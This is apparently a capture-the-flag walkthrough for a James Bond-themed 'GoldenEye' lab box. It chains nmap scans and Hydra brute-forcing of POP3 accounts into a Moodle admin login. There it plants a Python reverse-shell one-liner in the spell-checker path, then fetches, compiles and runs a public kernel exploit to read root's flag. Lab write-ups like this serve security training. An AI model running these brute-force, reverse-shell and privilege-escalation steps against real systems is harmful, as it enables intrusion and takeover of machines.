# Intro & Enumeration
## This room will be a guided challenge to hack the James Bond styled box and get root.
### Use nmap to scan the network for all ports. How many ports are open?
```bash
nmap -p- -Pn <IP>
```
- `-p-`: Allow us to scan all 65535 TCP ports
- `-Pn`: Skips the host discovery process (ping scan)

![SCREEN01](https://github.com/user-attachments/assets/f34b7e5d-dac3-42dc-8281-8948140eb645)

### Who needs to make sure they update their default password?

1. Go to the <IP>:80 site
2. Right click -> 'View Page Source'
3. In `view-source:http://<IP>/` go to `terminal.js`

![SCREEN02](https://github.com/user-attachments/assets/5db05da9-533f-44c4-b853-a6b3db6e7b89)

5. In `view-source:http://<IP>/terminal.js` we can see some interesting comments

![SCREEN03](https://github.com/user-attachments/assets/5b1964b2-4998-4662-8012-a9d78de5b390)

### Whats their password?
We can decode encoded password using [CyberChief](https://gchq.github.io/CyberChef/), and selecting '**From HTML Entity**'

# Its mail time...
## Onto the next steps
### If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra? Whats their new password?
Hint: pop3
1. Let's check the previously unknown ports for more information. We can see that port 55007 is for pop3
```bash
nmap -p 55006,55007 -sV <IP>
```
- `-p `: Allow us to scan selected ports
- `-sV`: Probes ports to determine service/version info

![SCREEN04](https://github.com/user-attachments/assets/4851ce8c-adf2-4445-8b55-3c0b324be1df)

2. Unfortunately previous credentials do not work
```bash
telnet <IP> 55007
USER boris
PASS I**r
```

![SCREEN05](https://github.com/user-attachments/assets/dfc1e445-e954-4ee6-9d82-5dfbdd465575)

3. So we go with the hydra:
```bash
hydra -l boris -P /root/Tools/wordlists/fasttrack.txt <IP> pop3 -s 55007
```
- `-l`: Single username specification
- `-P`: Password list file path
- `-s`: Port specification

![SCREEN06](https://github.com/user-attachments/assets/f41d0571-bd66-4f8e-af6a-c1b418345abf)

### What can you find on this service?

The answer is: `emails`

1. We can login with newly acquired password, and look through the messages
```bash
telnet <IP> 55007
USER boris
PASS s**!
LIST
RETR 1
RETR 2
RETR 3
QUIT
```
2. From message number 2 we can see that Boris was messaging with Natalya - so this will be our next target
```bash
hydra -l natalya -P /root/Tools/wordlists/fasttrack.txt <IP> pop3 -s 55007
```
![SCREEN07](https://github.com/user-attachments/assets/c6b83f8f-24cb-42c0-8919-8dcc9ebfe7b0)

3. Let's login to Natalya account. In second email we can find credentials for new student - xenia
```bash
telnet <IP> 55007
USER natalya
PASS b**d
LIST
RETR 1
RETR 2
```

![SCREEN08](https://github.com/user-attachments/assets/78d52198-479a-4719-b6a9-a939aa34dc8a)

### What user can break Boris codes?
We can find answer in second message for Boris and first for Natalya
![SCREEN09](https://github.com/user-attachments/assets/131cb6e7-6c8f-4a7b-a25f-9df6792e7c56)
![SCREEN10](https://github.com/user-attachments/assets/8f9ce12f-8f77-4ca6-884e-81161967d537)

# GoldenEye Operators Training
## Enumeration really is key. Making notes and referring back to them can be lifesaving. We shall now go onto getting a user shell.

### Try using credentials you found earlier. Which user can you login as?
It's the last one we have found `xenia:R**!`

### Have a poke around this site. What other users can you find?
We can find [message](http://severnaya-station.com/gnocertdir/message/index.php?viewing=unread&user2=5) from Dr. Doak

![SCREEN11](https://github.com/user-attachments/assets/e5a4ca76-eca9-4507-a7be-66c967867069)

### What was this user password?
We go back to hydra:
```bash
hydra -l doak -P /root/Tools/wordlists/fasttrack.txt <IP> pop3 -s 55007
```
![SCREEN12](https://github.com/user-attachments/assets/8de7680f-10e1-4978-bd37-6006a22e746c)

### What is the next user you can find from doak?
### What is the users password?
After login to pop3 in first email has them in plaintext:
```bash
telnet <IP> 55007
USER doak
PASS g**t
LIST
RETR 1
```
user and password `dr_doak:4**!`

![SCREEN13](https://github.com/user-attachments/assets/ff251acc-4ae0-4f77-bad7-975fd192a184)

# Privilege Escalation
##  Now that you have enumerated enough to get an administrative moodle login and gain a reverse shell, its time to priv esc.

### Whats the kernel version?
Hint: Settings->Aspell->Path to aspell field, add your code to be executed. Then create a new page and 'spell check it'.

1. Set listener with netcat:
```bash
nc -lvnp 1234
```
- `-l`: Listen mode
- `-v`: Verbose output
- `-n`: Skip DNS lookup
- `-p`: Specify the port number to listen on

2. Login to moodle with admin credentials `admin:x**!` from image, and search for '[spell](http://severnaya-station.com/gnocertdir/admin/search.php?query=spell)'. Change 'Spell engine' to 'PSpellShell' and put the below script into 'path to aspell':
```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
![SCREEN17](https://github.com/user-attachments/assets/bc6cf2b7-97ce-44b8-8767-08a0b8084a1c)

3. Now when activate spellcheck on [some text](http://severnaya-station.com/gnocertdir/mod/forum/post.php?forum=1) to get reverse shell

Once we are in:
```bash
uname -a
```
- `-a`: Displays all system information that `uname` can provide

![SCREEN14](https://github.com/user-attachments/assets/8b50efa4-41aa-4073-95ef-be5b00d4370b)

### What is the root flag?
1. Run to enable sending files:
```bash
python -m SimpleHTTPServer 1337
```

2. We need to modify 143 line of the [37292](https://www.exploit-db.com/exploits/37292) to look like this

![SCREEN15](https://github.com/user-attachments/assets/ebff44ae-de90-4d99-99e6-b3e9daed0a0f)

```bash
wget <IP>:<PORT>/37292.c
```
```bash
cc 37292.c -o exploit
```
```bash
./exploit
```
```bash
cat /root/.flag.txt
```
![SCREEN16](https://github.com/user-attachments/assets/e7403cca-5bcb-4316-b043-1c312140bc51)
